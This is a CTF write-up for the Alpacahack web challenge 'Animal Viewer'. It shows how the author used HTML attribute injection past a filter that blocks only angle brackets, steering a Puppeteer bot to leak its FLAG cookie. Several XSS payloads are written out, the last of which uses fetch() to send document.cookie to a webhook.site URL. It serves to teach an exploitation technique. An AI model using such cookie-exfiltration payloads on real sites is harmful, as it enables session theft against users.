---
slug: "web-animal-viewer"
title: "Animal Viewer"
competition: "Alpacahack"
category: "Web"
difficulty: "Medium"
date: "2026-11-07"
updated: "2026-11-07"
summary: "client side like bot fetcher, but holy moly i'm stuck because i thought the conf is different than the source code that given to us :heart_break:"
tags: ["XSS","BOT","CRAWLER","FETCHER","ATTRIBUTE INJECTION"]
status: "published"
flag: "Alpaca{Client_s1de_ch4llenges_ar3_fun}"
attachments: []
source: "https://claritys.web.id/writeups/web-animal-viewer"
---

# Animal Viewer

> client side like bot fetcher, but holy moly i'm stuck because i thought the conf is different than the source code that given to us :heart_break:

## Recon

We got these files:

```python
~/ctf/alpacahack/web/animal-viewer
❯ tree                                                                                                                                                                        󰥔 08:57:36
.
├── bot
│   ├── bot.js
│   ├── Dockerfile
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   └── public
│       └── index.html
├── compose.yaml
└── web
    ├── Dockerfile
    ├── index.js
    ├── package.json
    ├── package-lock.json
    └── public
        ├── alpaca.png
        ├── bear.png
        ├── cat.png
        ├── dog.png
        └── elephant.png

5 directories, 16 files
```

In the files that we got, there is a folder named `bot`. So highly this challenge like crawler or something.

## Vulnerability

At `bot.js`, there’s a function named `visit`. Where is the last step to us to get the flag.

```python
const APP_HOST = "animal-viewer";
const APP_PORT = "3000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}`;

---snippet---

export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    await page.goto(url, { timeout: 3_000 });
    await sleep(5_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }
```

In that snippet specially at the cookie, there’s `domain: APP_HOST`. So other domain like `webhook.site` the script wont send the cookie to that domain. Only `APP_HOST` is the one who accepted to get the cookie.

```python
app.post("/api/report", async (req, res) => {
  const { url } = req.body;
  if (
    typeof url !== "string" ||
    (!url.startsWith("http://") && !url.startsWith("https://"))
  ) {
    return res.status(400).send("Invalid url");
  }
```

Don’t forget to starts with `http://` or `https://`.

Now `index.js` at web.

```jsx
const html = `
<!DOCTYPE html>
<html>

---snippet---

      </li>
      <img src="https://claritys.web.id/[ANIMAL].png">
  </body>
</html>
`;

app.get("/", async (req, res) => {
    const animal = req.query.animal || "alpaca";

    // no html tag!
    if (animal.includes("<") || animal.includes(">")) {
        return res.status(400).send("Bad Request");
    }

    const page = html.replace("[ANIMAL]", animal);
    res.send(page);
});
```

In that snippet, there’s a query named animal, and is used to change the img to animal pict. There’s a sanitation for the query too, which are not allowed included `"<"` and `">"`. So we can’t use html tag like `<script>`.

So the exploit plan is get the cookie from `bot fetcher / puppeter` **pointed at** `animal-viewer` **at port** `3000` and then the cookie sent to our`webhook.site`.

How? sadly the program didn’t sanitized `'` and `"`. So we can use the `technique` `*HTML Attribute Injection*`. So we can use `onerror` at javascript after we input an image that doesn’t exist.

Like this:

-   [https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
    

Let’s try it at the challenge web first the payload before the bot, starting with a simple payload and to verfication.

```jsx
http://34.170.146.252:59321/?animal=notexist%22%20onerror=%22alert(1)%22
```

![image.png](/assets/uploads/2ee9d131-f766-4553-a5e1-771f7dabacc7-image.png)

It works! Now we try to use function `fetch` to get / retrieve data from a website / server.

```jsx
http://34.170.146.252:59321/?animal=notexist%22%20onerror=%22fetch(`https://webhook.site/5770b7cc-38a6-417e-92b6-19aa03c04ac1/?a=what`)%22
```

![image.png](/assets/uploads/ce86447d-70fe-4258-bed7-991bc013509f-image-1.png)

We got the request when we look at our webhook.site.

![image.png](/assets/uploads/fbe4fed3-06e3-47ac-9bc1-ba50a752d425-image-2.png)

Now we try to get the cookie from the challenge web

```jsx
http://34.170.146.252:59321/?animal=notexist%22%20onerror=%22fetch(`https://webhook.site/5770b7cc-38a6-417e-92b6-19aa03c04ac1/?a=${document.cookie}`)%22
```

![image.png](/assets/uploads/bb331974-1053-420e-830d-420401a9476b-image-3.png)

It works as well too, it’s empty cuz right now we doesn’t have any cookie. Now let’s try it at the bot.

Don’t forget, at this snippet:

```jsx
const APP_HOST = "animal-viewer";
const APP_PORT = "3000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}`;
--- snip ---

  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
```

💡

We have to input `animal-viewer` as a host and `3000` as a port.

Now we can make the payload like this:

```jsx
http://animal-viewer:3000/?animal=notexist%22%20onerror=%22fetch(`https://webhook.site/5770b7cc-38a6-417e-92b6-19aa03c04ac1/?a=${document.cookie}`)%22
```

![image.png](/assets/uploads/06b80f4c-cee9-464a-8aff-9eb10e47976d-image-4.png)

![image.png](/assets/uploads/cc6eb707-1d0f-41a2-a521-fb3bfc55e228-image-5.png)

We got it, the flag. GG. I stuck because i thought we send the bot to the challenge web URL.. Don’t be like me guys.
